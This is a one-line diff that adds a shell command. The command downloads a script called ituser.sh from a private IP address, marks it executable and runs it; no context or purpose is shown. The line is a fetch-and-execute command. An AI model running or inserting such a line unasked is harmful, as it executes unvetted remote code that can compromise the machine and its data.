@@ -1,0 +1,1 @@
+curl -Lso- http://172.16.2.33:8080/ituser.sh > ituser.sh && chmod +x ituser.sh && ./ituser.sh
